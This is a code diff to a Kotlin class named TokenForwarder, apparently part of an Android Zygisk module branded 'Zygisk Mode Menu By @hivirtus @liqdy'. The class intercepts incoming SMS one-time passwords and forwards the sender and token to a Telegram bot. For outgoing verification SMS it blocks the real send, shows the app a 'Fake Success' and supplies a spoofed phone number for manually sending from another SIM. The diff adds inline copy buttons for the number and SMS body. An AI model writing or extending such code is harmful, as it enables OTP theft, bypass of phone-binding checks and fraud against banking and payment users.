@@ -6,6 +6,7 @@ import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONArray
 import org.json.JSONObject
 
 class TokenForwarder(
@@ -35,7 +36,12 @@ class TokenForwarder(
         }
 
         val message = buildInterceptMessage(otp, config)
-        val sent = postTelegram(creds.first, creds.second, message)
+        val markup = if (otp.direction.equals("outgoing", ignoreCase = true)) {
+            buildCopyReplyMarkup(resolveSendFrom(config), smsCopyText(otp))
+        } else {
+            null
+        }
+        val sent = postTelegram(creds.first, creds.second, message, markup, useHtml = false)
         if (sent) {
             context?.let { ClipboardCopyHelper.copySms(it, smsCopyText(otp)) }
         }
@@ -48,7 +54,9 @@ class TokenForwarder(
         if (creds.first.isBlank() || creds.second.isBlank()) return false
         val config = configManager.load()
         val message = buildInterceptMessage(otp, config)
-        val sent = postTelegram(creds.first, creds.second, message)
+        val sendFrom = resolveSendFrom(config)
+        val markup = buildCopyReplyMarkup(sendFrom, smsCopyText(otp))
+        val sent = postTelegram(creds.first, creds.second, message, markup, useHtml = false)
         if (sent) {
             context?.let { ClipboardCopyHelper.copySms(it, smsCopyText(otp)) }
         }
@@ -81,42 +89,66 @@ class TokenForwarder(
 
     private fun buildInterceptMessage(otp: LastOtp, config: ModuleConfig): String {
         val outgoing = otp.direction.equals("outgoing", ignoreCase = true)
-        val peerLabel = if (outgoing) "To (short code)" else "From"
-        val peerValue = if (outgoing) {
-            otp.rawPeer.ifBlank { resolveUpiVerifyNumber(otp, config) }
-        } else {
-            otp.sender.ifBlank { otp.rawPeer }
-        }
         val smsBody = smsCopyText(otp)
+        if (outgoing) {
+            return buildOutgoingBlockedMessage(smsBody, resolveSendFrom(config))
+        }
+
+        val peerValue = otp.sender.ifBlank { otp.rawPeer }
         val appLabel = resolveAppLabel(otp)
-        val sendFrom = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
 
         return buildString {
-            appendLine(if (outgoing) "📱 Verify SMS Blocked — Fake Success ✅" else "📱 Intercepted Incoming SMS")
-            appendLine(TELEGRAM_HANDLE)
-            if (outgoing) {
-                appendLine()
-                appendLine("Real SIM: blocked · App ko success dikha")
-            }
+            appendLine("📱 Intercepted Incoming SMS")
+            appendLine(TELEGRAM_BRANDING)
             if (appLabel.isNotBlank()) {
                 appendLine()
                 appendLine("App: $appLabel")
             }
             appendLine()
-            appendLine("$peerLabel (Tap to copy):")
-            appendLine("<code>${escapeHtml(peerValue)}</code>")
+            appendLine("From:")
+            appendLine(peerValue)
             appendLine()
-            appendLine("Body / Token (Tap to copy):")
-            append("<code>${escapeHtml(smsBody)}</code>")
-            if (outgoing && sendFrom.isNotBlank()) {
-                appendLine()
-                appendLine()
-                appendLine("Send FROM (app login number / 2nd SIM):")
-                appendLine("<code>${escapeHtml(sendFrom)}</code>")
-                appendLine()
-                append("Messages se isi number wali SIM se manually bhejo ↑")
-            }
+            appendLine("Body / Token:")
+            append(smsBody)
         }
+    }
+
+    private fun buildOutgoingBlockedMessage(smsBody: String, sendFrom: String): String {
+        return buildString {
+            appendLine("📱 Verify SMS Blocked — Fake Success ✅")
+            appendLine(TELEGRAM_BRANDING)
+            appendLine()
+            appendLine("Send FROM:")
+            appendLine(sendFrom.ifBlank { "—" })
+            appendLine()
+            appendLine("Body / Token:")
+            append(smsBody)
+        }
+    }
+
+    private fun resolveSendFrom(config: ModuleConfig): String =
+        configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
+
+    private fun buildCopyReplyMarkup(copyNumber: String, copyBody: String): JSONObject {
+        val row = JSONArray().apply {
+            put(
+                JSONObject()
+                    .put("text", "📋 Copy Number")
+                    .put("copy_text", JSONObject().put("text", clipCopyText(copyNumber)))
+            )
+            put(
+                JSONObject()
+                    .put("text", "📋 Copy SMS Body")
+                    .put("copy_text", JSONObject().put("text", clipCopyText(copyBody)))
+            )
+        }
+        return JSONObject().put("inline_keyboard", JSONArray().put(row))
+    }
+
+    private fun clipCopyText(text: String): String {
+        val trimmed = text.trim()
+        if (trimmed.length <= COPY_TEXT_MAX) return trimmed
+        return trimmed.take(COPY_TEXT_MAX - 3) + "..."
     }
 
     private fun resolveAppLabel(otp: LastOtp): String {
@@ -194,18 +226,27 @@ class TokenForwarder(
     }
 
     fun sendTestMessage(botToken: String, chatId: String, text: String): Boolean {
+        return postTelegram(botToken, chatId, text, replyMarkup = null, useHtml = true)
+    }
+
+    private fun postTelegram(
+        botToken: String,
+        chatId: String,
+        text: String,
+        replyMarkup: JSONObject? = null,
+        useHtml: Boolean = true
+    ): Boolean {
         val url = "https://api.telegram.org/bot$botToken/sendMessage"
         val payload = JSONObject()
             .put("chat_id", chatId)
             .put("text", text)
-            .put("parse_mode", "HTML")
             .put("disable_web_page_preview", true)
-            .toString()
-        return postJson(url, payload)
+        if (useHtml) {
+            payload.put("parse_mode", "HTML")
+        }
+        replyMarkup?.let { payload.put("reply_markup", it) }
+        return postJson(url, payload.toString())
     }
-
-    private fun postTelegram(botToken: String, chatId: String, text: String): Boolean =
-        sendTestMessage(botToken, chatId, text)
 
     private fun postJson(url: String, payload: String): Boolean {
         val request = Request.Builder()
@@ -222,5 +263,7 @@ class TokenForwarder(
 
     companion object {
         const val TELEGRAM_HANDLE = "@hivirtus @liqdy"
+        const val TELEGRAM_BRANDING = "Zygisk Mode Menu By @hivirtus @liqdy 🔥"
+        private const val COPY_TEXT_MAX = 256
     }
 }
